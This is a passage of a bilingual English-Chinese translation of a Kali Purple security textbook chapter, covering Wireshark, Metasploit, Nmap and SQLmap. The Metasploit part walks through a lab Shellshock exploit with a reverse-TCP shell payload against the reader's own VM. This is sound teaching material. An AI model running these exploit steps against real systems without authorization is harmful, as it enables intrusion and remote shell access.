  zh: '**数据包分析**：简而言之，Wireshark捕获网络中的数据包并以可读的格式显示，允许用户深入分析每个数据包的内容。'
- en: '**Live capture for offline analysis**: A nice feature of Wireshark is that
    while users can capture the packets in real time, they can also save those packets
    so that they can reopen them later for offline analysis. This also allows the
    users to attach those packet capture files to emails or ticketing systems as artifact
    evidence to support conclusions or to allow other analysts to evaluate the information
    for comparison.'
  id: totrans-95
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**离线分析的实时捕获**：Wireshark的一个好功能是，用户不仅可以实时捕获数据包，还可以将这些数据包保存下来，方便之后重新打开进行离线分析。这也使得用户能够将这些数据包捕获文件作为证据附加到电子邮件或工单系统中，用于支持结论或让其他分析人员评估信息以进行比较。'
- en: '**Support for multiple protocols**: Wireshark’s wide array of protocol support
    includes protocols such as TCP, UDP, IP, HTTP, HTTPS, DNS, and others. This increases
    the utility of Wireshark substantially as analysts can examine information that
    supports the most common styles of network traffic.'
  id: totrans-96
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**支持多种协议**：Wireshark广泛的协议支持包括TCP、UDP、IP、HTTP、HTTPS、DNS等协议。这大大增强了Wireshark的实用性，因为分析人员可以检查支持最常见网络流量样式的信息。'
- en: '**Deep inspection**: Part of conducting a solid analysis of network traffic
    is having the ability to drill down deeply into the individual packets that are
    captured by Wireshark. This is where very detailed information resides. It might
    include information such as source and destination IP addresses, the timing of
    packets, and details that are specific to the protocols being examined.'
  id: totrans-97
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**深度检查**：进行网络流量的有效分析的一部分是能够深入挖掘Wireshark捕获的单个数据包。这是非常详细信息所在的地方。它可能包括诸如源和目标IP地址、数据包的时间戳以及与所检查协议相关的详细信息等。'
- en: '**Filtering and search**: Wireshark offers filtering capabilities that focus
    on specific packets based on criteria such as IP addresses, protocols, and packet
    contents. Users can also filter by searching for specific strings that might be
    contained within the packets.'
  id: totrans-98
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**过滤和搜索**：Wireshark提供过滤功能，可以根据IP地址、协议和数据包内容等标准聚焦于特定数据包。用户还可以通过搜索特定字符串来进行过滤，这些字符串可能包含在数据包中。'
- en: '**Statistics and graphs**: Wireshark offers statistical analysis tools and
    graphs to help visualize network traffic patterns, packet distribution, and protocol
    usage.'
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**统计与图表**：Wireshark提供统计分析工具和图表，帮助可视化网络流量模式、数据包分布和协议使用情况。'
- en: '**Color coding**: A very handy feature that Wireshark provides is the ability
    to color-code packets based on different sets of criteria that may or may not
    apply to the packet in question. This helps with the readability of the packet
    capture logs and creates an avenue of efficiency for analysts to narrow down threats,
    vulnerabilities, and/or **indicators of** **compromise** (**IoCs**).'
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**颜色编码**：Wireshark提供的一个非常实用的功能是能够根据不同的标准对数据包进行颜色编码，这些标准可能适用于或不适用于特定数据包。这有助于提高数据包捕获日志的可读性，并为分析人员提供高效的手段，以便缩小威胁、漏洞和/或**入侵指示符**（**IoCs**）的范围。'
- en: '**Customization**: The Wireshark interface is highly customizable, with the
    user being able to set their preferences and display filters to weed out any unnecessary
    data and narrow down the results to display only what the user deems important
    to consider. If the user doesn’t find what they are looking for, they can easily
    change their preferences to display the data with additional considerations or
    to display different data altogether, even if it’s been taken from the same packet
    capture.'
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**定制化**：Wireshark界面高度可定制，用户可以设置偏好和显示过滤器，剔除不必要的数据，缩小结果范围，仅显示用户认为重要的内容。如果用户没有找到想要的内容，他们可以轻松更改偏好，使用额外的标准显示数据，或展示完全不同的数据，即使这些数据来自同一数据包捕获。'
- en: '**Voice over IP (VoIP) analysis**: VoIP traffic is becoming more and more common
    as businesses and individuals continue to adopt digital communications solutions.
    Wireshark can capture VoIP packets for analysis as well! With these packets, users
    can monitor call quality, identify VoIP protocols, and troubleshoot voice communication
    issues.'
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**语音通信（VoIP）分析**：随着企业和个人继续采用数字通信解决方案，VoIP流量变得越来越常见。Wireshark也可以捕获VoIP数据包进行分析！通过这些数据包，用户可以监控通话质量、识别VoIP协议，并排除语音通信问题。'
- en: '**Cross-platform compatibility**: We’ve talked about cross-platform compatibility
    before and in the most general sense, you would usually see it as a reference
    to an application being compatible with both Windows and Linux and maybe also
    macOS. That is the case with Wireshark, which is compatible with all three of
    the major operating systems.'
  id: totrans-103
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**跨平台兼容性**：我们之前讨论过跨平台兼容性，一般而言，这通常是指一个应用程序兼容Windows、Linux，可能还有macOS。Wireshark就符合这一点，它兼容所有三大主流操作系统。'
- en: '**Capture file export**: As we discussed when we talked about live capture,
    users can save the packet capture files for future use, including offline examination,
    for sharing with colleagues, or attaching to ticketing systems for artifact evidence.
    These files can be saved and exported as PCAP, CSV, or plain text files.'
  id: totrans-104
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**捕获文件导出**：正如我们在讨论实时捕获时提到的，用户可以保存数据包捕获文件以供未来使用，包括离线检查、与同事共享或附加到工单系统作为证据。这些文件可以保存并导出为PCAP、CSV或纯文本文件。'
- en: '**Protocol decoding support**: Wireshark is built with the ability to decode
    and display data from hundreds of protocols, allowing analysts to gain deep insights
    into the network communications being examined.'
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**协议解码支持**：Wireshark具备解码并展示来自数百种协议的数据的能力，帮助分析人员深入了解正在检查的网络通信。'
- en: Like ZAP, Wireshark should already be installed within your Kali Purple instance.
    Let’s check this by trying to install it anew, like we did with ZAP.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 和ZAP一样，Wireshark应该已经安装在你的Kali Purple实例中。让我们像安装ZAP时那样，尝试重新安装它来检查。
- en: Alternatively, we can select the Kali dragon icon in the top-left corner of
    our environment and either type **Wireshark** in the search bar or scroll down
    and highlight **Protect** and then move our cursor to the newly expanded column
    on the right-hand side. At this point, we can scroll near the bottom to find and
    click on the **Wireshark** option.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，我们可以选择环境左上角的Kali龙图标，然后在搜索栏中输入**Wireshark**，或者向下滚动并高亮显示**Protect**，然后将光标移到右侧新展开的栏中。此时，我们可以滚动至底部，找到并点击**Wireshark**选项。
- en: Otherwise, if you prefer to type, then type **sudo apt update**; if the results
    suggest making some upgrades, type **sudo apt upgrade** to install them. Once
    you’re finished, type **sudo apt install wireshark** to formally install Wireshark.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你更喜欢输入命令，可以输入**sudo apt update**；如果结果建议进行一些升级，输入**sudo apt upgrade**来安装它们。完成后，输入**sudo
    apt install wireshark**来正式安装Wireshark。
- en: 'Let’s launch the application. To do that, type **wireshark**. When the application
    loads, you will be asked to select the network interface you wish to capture traffic
    from. For our working example, let’s just select the **eth0** interface; this
    will likely be the first item in the list and already be highlighted for you.
    Once that field is highlighted, move your cursor to the blue shark fin icon, which
    resides directly under the word **File** at the top left, as shown in *Figure
    10**.12*:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们启动应用程序。为此，输入**wireshark**。当应用程序加载后，系统会要求你选择要捕获流量的网络接口。对于我们的工作示例，我们选择**eth0**接口；这个通常是列表中的第一个项目，且已经被高亮显示。选中该字段后，将光标移动到蓝色鲨鱼鳍图标上，该图标位于左上角的**文件**一词下方，如*图10.12*所示：
- en: '![Figure 10.12 – Wireshark – selecting a network interface and starting a packet
    capture](image/B21223_10_12.jpg)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![图10.12 – Wireshark – 选择网络接口并开始数据包捕获](image/B21223_10_12.jpg)'
- en: Figure 10.12 – Wireshark – selecting a network interface and starting a packet
    capture
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.12 – Wireshark – 选择网络接口并开始数据包捕获
- en: Select the **Start capturing packets** shark fin icon in the top-left corner.
    Now, within your Kali Purple environment, load any web browser and go to any website
    to create some traffic for Wireshark to capture. Once you’ve done this, return
    to the Wireshark application and select the red square icon next to the shark
    fin icon to stop capturing packets.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 选择左上角的**开始捕获数据包**鲨鱼鳍图标。现在，在你的Kali Purple环境中，打开任意网页浏览器并访问任何网站，以便为Wireshark创建一些流量进行捕获。完成此操作后，返回Wireshark应用程序并选择鲨鱼鳍图标旁边的红色方块图标停止捕获数据包。
- en: 'You’ll immediately note that the main window fills with rows and rows of data,
    as shown in *Figure 10**.13*. Each row is a packet capture, and they will be color-coded
    within your environment:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 你会立即注意到，主窗口填满了成排的数据，如*图10.13*所示。每一行都是一个数据包捕获，且在你的环境中，它们会按颜色进行编码：
- en: '![Figure 10.13 – Wireshark after collecting network packets](image/B21223_10_13.jpg)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![图10.13 – Wireshark收集网络数据包后的界面](image/B21223_10_13.jpg)'
- en: Figure 10.13 – Wireshark after collecting network packets
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.13 – Wireshark收集网络数据包后的界面
- en: In the lower-left window, known as the packet details pane, you’ll notice some
    topics with arrows to the left that you can click on to expand. This will allow
    you to do a deep dive into the information you’ve captured. In our case, the first
    line would be the frame we’ve highlighted in the main window. The second references
    the type of network interface we captured from, which is Ethernet II. The third
    one tells us the IP protocol we captured – for us, it’s IPv4\. It identifies our
    traffic as TCP traffic. However, in the process of packet capture, you will most
    assuredly see frames with UDP listed here just as often. After that, you’ll see
    any number of different protocols for deeper analysis, including DNS and HTTP.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 在左下角的窗口中，即数据包详细信息窗格，你会注意到一些带有左箭头的主题，可以点击它们进行展开。这将允许你深入分析你捕获的信息。在我们的例子中，第一行将是我们在主窗口中高亮显示的帧。第二行提到我们捕获的网络接口类型，这是以太网II。第三行告诉我们捕获的IP协议—在我们的例子中是IPv4。它将我们的流量标识为TCP流量。然而，在数据包捕获过程中，你很可能会看到列出UDP的帧，频率同样很高。之后，你将看到各种不同的协议以供进一步分析，包括DNS和HTTP。
- en: Wireshark is a strongly developed application with a very long history and there
    are an abundance of free training materials out there to help you master this
    program if you’d like to become a packet capture and analysis guru. We’ve tossed
    some valuable links in the *Further* *reading* section.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: Wireshark是一款功能强大的应用程序，拥有非常悠久的历史，并且有大量免费的培训材料可以帮助你掌握这个程序，如果你想成为一个数据包捕获和分析的高手。我们在*进一步阅读*部分提供了一些有价值的链接。
- en: 'Wireshark helps you evaluate the angle of attack and the styles of attackers,
    as well as what the intended target of the attacker might be. In the next section,
    we are going to learn about one of the most robust and popular exploitation and
    malicious payload delivery applications in the cybersecurity world today: Metasploit.
    It is popular with pentesters and cybercriminals alike and has a robust database
    of already prepared malicious payloads and attack styles at the ready.'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: Wireshark帮助你评估攻击角度和攻击者的风格，以及攻击者的预定目标可能是什么。在接下来的章节中，我们将学习今天网络安全领域中最强大、最流行的利用和恶意有效载荷投递应用程序之一：Metasploit。它在渗透测试人员和网络犯罪分子中都很受欢迎，并且拥有一个强大的恶意有效载荷和攻击风格数据库，随时可以使用。
- en: Metasploit
  id: totrans-119
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit
- en: 'Though mostly spoken of as a penetration testing framework, anyone who’s worked
    in the field of cybersecurity for a year or less knows that Metasploit is also
    one of the most popular weapons of choice in use by cybercriminals. This framework
    comes pre-packed with cyberattacks and malicious payloads already built in. Some
    of the other tools you’ll encounter in your cyber career are included in the Metasploit
    framework, most notably the aforementioned Nmap. While a popular and valuable
    penetration testing tool, make no mistake: Metasploit is an extremely vicious
    weapon if placed into the wrong hands.'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管Metasploit通常被视为一个渗透测试框架，但任何在网络安全领域工作一年或更少的人都知道，Metasploit也是网络犯罪分子最常用的武器之一。这个框架预先包含了各种网络攻击和恶意有效载荷。你在网络安全职业生涯中可能会遇到的其他工具也包含在Metasploit框架中，最著名的就是前面提到的Nmap。尽管Metasploit是一个流行且有价值的渗透测试工具，但不要误解：如果落入错误之手，Metasploit将是一个极其危险的武器。
- en: Being a core component of red teaming and pentesting, Metasploit is already
    included in the Kali Linux distribution. You can access it by selecting the Kali
    Purple dragon icon, as you’ve done with other utilities, scrolling down, hovering
    your mouse over the **Exploitation Tools** field, and then selecting it from the
    menu that expands to the right. You can also start typing **Metasploit** into
    the search bar at the top and select it as it populates.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 作为红队与渗透测试的核心组件，Metasploit已经包含在Kali Linux发行版中。你可以像使用其他工具一样，选择Kali Purple龙图标，向下滚动，鼠标悬停在**Exploitation
    Tools**区域上，然后从向右扩展的菜单中选择它。你也可以开始在顶部的搜索栏中输入**Metasploit**，并在它出现时选择它。
- en: 'But before you do this, let’s write our script. Navigate to **cgi-bin** by
    typing **cd /usr/lib/cgi-bin**. Then, create your script file within that location
    by typing **sudo nano metatest.sh**. Once you’re inside that file, add the following
    lines, as shown in *Figure 10**.14*:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 但在此之前，让我们编写脚本。通过输入**cd /usr/lib/cgi-bin**来导航到**cgi-bin**目录。然后，输入**sudo nano
    metatest.sh**在该位置创建脚本文件。一旦进入文件，添加以下行，如*图10.14*所示：
- en: '**#! /****bin/bash**'
  id: totrans-123
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**#! /****bin/bash**'
- en: '**echo "****Content-type: text/html"**'
  id: totrans-124
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**echo "****Content-type: text/html"**'
- en: '**echo " "**'
  id: totrans-125
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**echo " "**'
- en: '**echo "You''ve** **been Pwned!"**:'
  id: totrans-126
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**echo "你已经** **被攻陷了!"**:'
- en: '![Figure 10.14 – Our first Metasploit attack script](image/B21223_10_14.jpg)'
  id: totrans-127
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.14 – 我们的第一个Metasploit攻击脚本](image/B21223_10_14.jpg)'
- en: Figure 10.14 – Our first Metasploit attack script
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.14 – 我们的第一个Metasploit攻击脚本
- en: Before launching the actual application, let’s save our script by pressing *Ctrl*
    + *X* to close the file and *Y* if you wish to save it (hopefully you do; otherwise,
    you’ll have to type it all over again!). Now, return to the Kali Purple dragon
    icon, hover your mouse over the **Exploitation Tools** field, and select **Metasploit**
    from the menu.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 在启动实际应用程序之前，让我们通过按 *Ctrl* + *X* 来保存我们的脚本并关闭文件，若希望保存文件，按 *Y*（希望你会保存；否则，你得重新输入一遍！）。现在，回到Kali
    Purple龙图标，鼠标悬停在**Exploitation Tools**区域上，然后从菜单中选择**Metasploit**。
- en: You can also invoke Metasploit directly from the command line. However, before
    you do that, you should initialize the Metasploit database by typing **sudo msfdb
    init**. The reason is that we aren’t letting you go away without having some fun.
    We’re going to launch an exploit with Metasploit right here, right now.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 你也可以直接从命令行调用Metasploit。但在此之前，你应通过输入**sudo msfdb init**来初始化Metasploit数据库。原因是我们不想让你错过任何有趣的部分。我们将立即在这里使用Metasploit发起一次攻击。
- en: 'Once the database has been initialized, start the beast by typing **msfconsole**
    to invoke the application. When you do, it may take a few moments to load because
    of its very large database of exploits and payloads, as shown in *Figure 10**.15*:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦数据库初始化完成，通过输入**msfconsole**启动程序。当你执行此命令时，由于它包含庞大的漏洞和有效载荷数据库，可能需要一些时间来加载，如*图
    10.15*所示：
- en: '![Figure 10.15 – Metasploit initialization](image/B21223_10_15.jpg)'
  id: totrans-132
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.15 – Metasploit 初始化](image/B21223_10_15.jpg)'
- en: Figure 10.15 – Metasploit initialization
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.15 – Metasploit 初始化
- en: 'Now that Metasploit has been loaded, we are going to find and use the Shellshock
    vulnerability. Type **search shellshock** to get a listing of all the various
    exploits related to this vulnerability, as shown in *Figure 10**.15*. Now, we
    need to tell Metasploit which of these exploits we intend to use. We’ll use the
    Apache mod version. To do so, type **use exploit/multi/http/apache_mod_cgi_bash_env_exec**.
    Now, we need to tell Metasploit who the attacking machine is and who the target
    machine is. Type **set RHOST <target IP address>** and make sure you have permission
    to attack this target. Try using your VM IP address like we did. Next, type **set
    LHOST <attacker IP address>**. In our case, this will be the localhost:'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 现在Metasploit已经加载完毕，我们将找到并使用Shellshock漏洞。输入**search shellshock**来列出所有与该漏洞相关的攻击方式，如*图
    10.15*所示。接下来，我们需要告诉Metasploit我们打算使用其中的哪种漏洞利用方式。我们将使用Apache mod版本。为此，输入**use exploit/multi/http/apache_mod_cgi_bash_env_exec**。接下来，我们需要告诉Metasploit攻击者机器和目标机器的IP地址。输入**set
    RHOST <target IP address>**，并确保你有权限攻击这个目标。可以像我们一样使用虚拟机的IP地址。然后，输入**set LHOST <attacker
    IP address>**，在我们的案例中，这是本地主机的IP地址：
- en: '![Figure 10.16 – Metasploit exploit preparation](image/B21223_10_16.jpg)'
  id: totrans-135
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.16 – Metasploit 攻击准备](image/B21223_10_16.jpg)'
- en: Figure 10.16 – Metasploit exploit preparation
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.16 – Metasploit 攻击准备
- en: Now that we’ve told Metasploit which device to attack by setting the RHOST IP
    address, we still need to tell it where to find the script we just created. Type
    **set targeturi /cgi-bin/metatest.sh** and set the payload by typing **set** **payload
    linux/x86/shell/reverse_tcp**.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经通过设置RHOST IP地址告诉Metasploit要攻击哪个设备，接下来我们仍然需要告诉它在哪里找到我们刚刚创建的脚本。输入**set targeturi
    /cgi-bin/metatest.sh**，并通过输入**set payload linux/x86/shell/reverse_tcp**来设置有效载荷。
- en: You can type **show options** to get an overview of all the fields within your
    exploit that have been filled out or might still need to be filled out. When you’re
    satisfied, type **exploit** to begin the exploit. Your terminal will notify you
    if it was successful.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以输入**show options**来查看已填写或可能仍需填写的所有字段。当你满意时，输入**exploit**开始攻击。终端将通知你攻击是否成功。
- en: Scanners
  id: totrans-139
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 扫描器
- en: Each of the tools we’ve covered in this chapter thus far has a unique specialty.
    In this section, we are going to cover a group of tools that each have a unique
    specialty but within the same overall concept of scanning. Scanning is part of
    the reconnaissance phase of a cyberattack. It’s where the attacker gets useful
    information to narrow their attack vector and better plan their strategy. Different
    scanners have different areas of emphasis. We are going to begin with the extremely
    popular, lightweight, and time-tested Nmap network scanner.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们在本章中介绍的每一个工具都有其独特的专长。在本节中，我们将介绍一组工具，它们虽然各具特色，但都属于同一个整体概念——扫描。扫描是网络攻击侦察阶段的一部分。在这个阶段，攻击者获取有用的信息，以缩小攻击向量并更好地规划攻击策略。不同的扫描器有不同的重点。我们将从极受欢迎、轻量级且经过时间考验的Nmap网络扫描器开始。
- en: Nmap
  id: totrans-141
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Nmap
- en: If you were to go around asking professional penetration testers to list their
    top five favorite tools, you’d be hard-pressed to find a single one who doesn’t
    list Nmap among them. Nmap is a very powerful network exploration tool and is
    regularly used for security auditing. It is designed to discover network nodes
    – hosts – along with some network-related services within a computer network.
    In doing so, it can create a map of the network’s structure, hence the name.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你去问专业的渗透测试人员列出他们最喜欢的五个工具，你会发现几乎没有人不把Nmap列在其中。Nmap是一款功能强大的网络探测工具，经常用于安全审计。它旨在发现计算机网络中的网络节点——主机——以及一些与网络相关的服务。在此过程中，它能够绘制出网络结构图，因此得名。
- en: Nmap uses raw IP packets to determine what hosts are available on the network,
    which services are available on those hosts to include the application names and
    versions, the operating system versions the hosts are running, as well as which
    type of packet filters and firewalls are in use. This is just a high-level overview
    that’s meant to highlight the most common uses of Nmap. It can be used to detect
    numerous other characteristics as well.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap使用原始IP数据包来确定网络上哪些主机是可用的，哪些服务在这些主机上可用，包括应用程序名称和版本、主机正在运行的操作系统版本，以及正在使用的包过滤器和防火墙类型。这只是一个高层次的概述，旨在突出Nmap最常见的用途。它也可以用来检测许多其他特征。
- en: 'Here are some of Nmap’s key features:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是Nmap的一些关键功能：
- en: '**Host discovery**: This tends to be the default visualization folks get when
    thinking of Nmap, even though the utility is much, much more than what you are
    about to discover. Host discovery is exactly as it sounds. Nmap sends packets
    across the network and analyzes the responses to determine which hosts are available
    and active on the network.'
  id: totrans-145
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**主机发现**：这是人们在想到Nmap时通常默认的可视化方式，尽管该工具远不止于此。主机发现的工作原理正如其名。Nmap发送数据包穿越网络，并分析响应，以确定哪些主机在网络上可用且处于活动状态。'
- en: '**Port scanning**: Nmap can scan ports on target hosts to identify open ports
    and services running on those ports. It supports a variety of port scanning styles,
    including a SYN scan, TCP connect scan, UDP scan, and others. This high level
    of flexibility is crucial for ethical hackers/pentesters and malicious cyber criminals
    alike because it helps them all paint a clearer picture of the total attack surface
    of a network.'
  id: totrans-146
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**端口扫描**：Nmap可以扫描目标主机上的端口，识别开放的端口以及在这些端口上运行的服务。它支持多种端口扫描方式，包括SYN扫描、TCP连接扫描、UDP扫描等。这个高度的灵活性对于道德黑客/渗透测试人员以及恶意网络犯罪分子都至关重要，因为它有助于他们描绘出网络攻击面更清晰的全貌。'
- en: '**Service version detection**: In addition to providing extensive support for
    IPv6, Nmap can also detect versions of applications/services that are running
    on the target host. It can also detect network-specific devices and services.
    This is important because it can help in identifying vulnerabilities based on
    and known to be associated with specific versions, as well as network composition
    and overall layout.'
  id: totrans-147
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**服务版本检测**：除了广泛支持IPv6，Nmap还可以检测目标主机上运行的应用程序/服务版本。它还可以检测特定于网络的设备和服务。这一点非常重要，因为它有助于根据已知与特定版本相关的漏洞以及网络组成和整体布局来识别漏洞。'
- en: '**Operating system detection**: Nmap will make an educated guess about which
    operating system is operating on a target host by analyzing the various network
    packet responses it receives. Each type of operating system has unique behaviors
    in the way they operate, much the same as people – even similar people – have
    subtle uniqueness associated with them.'
  id: totrans-148
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**操作系统检测**：Nmap通过分析接收到的各种网络数据包响应，来推测目标主机上运行的操作系统。每种操作系统在操作方式上都有独特的行为，就像人类——即使是相似的人——也有微妙的独特性。'
- en: '**Scriptable interaction**: Nmap includes a scripting engine to allow users
    to write scripts to automate a wide variety of networking tasks, from vulnerability
    detection to advanced network discovery tasks.'
  id: totrans-149
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**可脚本化的交互**：Nmap包含一个脚本引擎，允许用户编写脚本来自动化各种网络任务，从漏洞检测到高级网络发现任务。'
- en: '**Flexible timing and performance**: Because it’s valuable in automation, Nmap
    provides options to control the timing of scans. The reason controlling this is
    important is because it allows pentesters to balance speed and stealth more closely
    according to their needs.'
  id: totrans-150
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**灵活的时序和性能**：由于在自动化中的重要性，Nmap提供了控制扫描时序的选项。控制时序非常重要，因为它使渗透测试人员能够根据需求更加精准地平衡速度和隐蔽性。'
- en: '**Output options**: Nmap supports a variety of output formats, including an
    interactive mode, a grepable mode, XML, and other formats that are used for reporting
    purposes so that other analysts can review scan results.'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**输出选项**：Nmap 支持多种输出格式，包括交互模式、grep 模式、XML 格式以及其他用于报告的格式，供其他分析人员查看扫描结果。'
- en: You’re probably beginning to sense a theme developing here, but Nmap should
    already be installed within your Kali Purple instance. You can check this by selecting
    the Kali dragon icon in the top-left corner of your environment and either typing
    **Nmap** in the search bar or scrolling down and highlighting **Information Gathering**
    and then moving your cursor to the newly expanded column on the right-hand side.
    Once you’ve done this, scroll until you find the **Nmap** option. At the command
    line, do your thing. Type **sudo apt update** and **sudo apt upgrade** if it suits
    you. Follow this with **sudo apt** **install nmap**.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能已经开始感受到这里出现的主题，但 Nmap 应该已经在你的 Kali Purple 实例中安装好了。你可以通过在环境的左上角选择 Kali 龙图标，并在搜索框中输入
    **Nmap**，或者向下滚动并高亮显示 **信息收集**，然后将光标移到右侧新展开的列中来检查这一点。完成后，继续滚动，直到找到 **Nmap** 选项。在命令行中，执行你的操作。如果需要，可以输入
    **sudo apt update** 和 **sudo apt upgrade**。然后输入 **sudo apt install nmap**。
- en: 'Unlike the previous applications we’ve covered in this chapter, Nmap doesn’t
    have a pretty GUI to work from. You will use it directly from the command line,
    even if you invoke the application by using the drop-down menu and icon. To use
    Nmap from the command line, simply type **sudo nmap <options> <target>**. You
    can type **nmap** alone to get a listing of available options. The target will
    be something like the value of an IP address, URL, or hostname. For a fun example,
    after typing **nmap** and reviewing the options, type **nmap -v -sn -T1 127.0.0.1**
    and compare your results to what’s shown in *Figure 10**.17*. Review the list
    of options you typed and compare them to that output and the list that’s printed
    to your screen when after typing **nmap**. You should begin to understand what’s
    going on by making those comparisons. Play around with different options as much
    as you like but remember not to scan any host, URL, or IP address that you don’t
    have explicit permission to scan:'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 与本章中之前介绍的应用程序不同，Nmap 没有一个漂亮的 GUI 界面供你操作。你将直接通过命令行使用它，即使你是通过下拉菜单和图标调用该应用程序的。要从命令行使用
    Nmap，只需输入 **sudo nmap <options> <target>**。你可以单独输入 **nmap** 以获取可用选项的列表。目标将是像 IP
    地址、URL 或主机名这样的值。举个有趣的例子，在输入 **nmap** 并查看选项后，输入 **nmap -v -sn -T1 127.0.0.1**，并将你的结果与
    *图 10.17* 中显示的进行比较。查看你输入的选项列表，并将其与在输入 **nmap** 后打印到屏幕上的输出列表进行比较。通过这些比较，你应该开始理解发生了什么。尽情玩弄不同的选项，但记住不要扫描任何你没有明确授权的主机、URL
    或 IP 地址：
- en: '![Figure 10.17 – Nmap example scan of the localhost](image/B21223_10_17.jpg)'
  id: totrans-154
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.17 – 本地主机的 Nmap 示例扫描](image/B21223_10_17.jpg)'
- en: Figure 10.17 – Nmap example scan of the localhost
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.17 – 本地主机的 Nmap 示例扫描
- en: SQLmap
  id: totrans-156
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: SQLmap
- en: Nmap specializes in network scanning. There is another type of vulnerability
    scanner that specializes in detecting database vulnerabilities in SQL databases
    associated with web applications. It is aptly named **SQLmap**, and it does more
    than just detect vulnerabilities. It also helps to exploit them.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 专注于网络扫描。还有另一种漏洞扫描器，专门用于检测与 Web 应用程序相关联的 SQL 数据库中的数据库漏洞。它被恰当地命名为 **SQLmap**，并且它不仅仅是检测漏洞，它还帮助利用这些漏洞。
- en: 'Some of the key features of SQLmap are as follows:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: SQLmap 的一些关键功能如下：
- en: '**Automated SQL injection detection**: SQLmap is built to automatically detect
    SQL injection vulnerabilities within web applications by analyzing responses from
    the target, much like Nmap does, but it can also exploit these vulnerabilities.
    It performs these exploits through various actions, such as dumping database contents,
    altering database structures, or executing arbitrary commands on the server.'
  id: totrans-159
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**自动化 SQL 注入检测**：SQLmap 是专门用于自动检测 Web 应用程序中的 SQL 注入漏洞的工具，它通过分析目标的响应来执行此操作，类似于
    Nmap，但它还可以利用这些漏洞。它通过各种操作执行这些漏洞利用，例如转储数据库内容、修改数据库结构或在服务器上执行任意命令。'
- en: '**Support for multiple database management systems**: SQLmap supports various
    database management systems, including the well-known MySQL, Oracle, and PostgreSQL,
    along with Microsoft SQL Server, SQLite, and others. This adds a level of versatility
    to the application.'
  id: totrans-160
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**支持多个数据库管理系统**：SQLmap 支持各种数据库管理系统，包括知名的 MySQL、Oracle 和 PostgreSQL，以及 Microsoft
    SQL Server、SQLite 等其他系统。这增加了应用程序的灵活性。'
- en: '**Detection and database schema data**: This application can identify the database
